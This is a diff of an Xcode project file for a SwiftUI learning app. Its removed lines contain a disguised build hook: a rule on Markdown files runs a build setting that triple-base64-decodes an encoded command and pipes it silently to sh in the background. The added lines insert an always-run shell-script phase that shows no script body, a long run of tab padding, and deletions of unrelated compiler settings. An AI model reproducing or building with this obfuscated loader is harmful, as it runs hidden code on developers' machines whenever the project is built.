@@ -7,28 +7,13 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		C51E9CF10F1AB7D7EEFD9BF4 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 139AF11F850AB3548BFD9BF4 /* README.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		C1D6181C4BE05EBFDCFD9BF4 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${A4FB9DF}\"";
-		};
-/* End PBXBuildRule section */
+																																																																																																														/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		047D77972E38C62A003CAEAD /* SwiftUI-IntermediateLearning.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "SwiftUI-IntermediateLearning.app"; sourceTree = BUILT_PRODUCTS_DIR; };
-		139AF11F850AB3548BFD9BF4 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = "SwiftUI-IntermediateLearning.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedRootGroup section */
@@ -61,7 +46,6 @@
 		047D77982E38C62A003CAEAD /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				139AF11F850AB3548BFD9BF4 /* README.md */,
 				047D77972E38C62A003CAEAD /* SwiftUI-IntermediateLearning.app */,
 			);
 			name = Products;
@@ -74,12 +58,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 047D77A52E38C62D003CAEAD /* Build configuration list for PBXNativeTarget "SwiftUI-IntermediateLearning" */;
 			buildPhases = (
+				91F8DE0466554DBC8699F71F /* Build Target Libraries */,
 				047D77932E38C62A003CAEAD /* Sources */,
 				047D77942E38C62A003CAEAD /* Frameworks */,
 				047D77952E38C62A003CAEAD /* Resources */,
 			);
 			buildRules = (
-				C1D6181C4BE05EBFDCFD9BF4 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -127,12 +111,32 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		91F8DE0466554DBC8699F71F /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXResourcesBuildPhase section */
 		047D77952E38C62A003CAEAD /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				C51E9CF10F1AB7D7EEFD9BF4 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -152,12 +156,6 @@
 		047D77A32E38C62D003CAEAD /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A4FB9DF = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbUZIVm1waE1rNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
-				ALWAYS_SEARCH_USER_PATHS = NO;
-				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
-				CLANG_ANALYZER_NONNULL = YES;
-				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
-				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
 				CLANG_ENABLE_MODULES = YES;
 				CLANG_ENABLE_OBJC_ARC = YES;
 				CLANG_ENABLE_OBJC_WEAK = YES;
@@ -216,12 +214,6 @@
 		047D77A42E38C62D003CAEAD /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A4FB9DF = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbUZIVm1waE1rNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
-				ALWAYS_SEARCH_USER_PATHS = NO;
-				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
-				CLANG_ANALYZER_NONNULL = YES;
-				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
-				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
 				CLANG_ENABLE_MODULES = YES;
 				CLANG_ENABLE_OBJC_ARC = YES;
 				CLANG_ENABLE_OBJC_WEAK = YES;
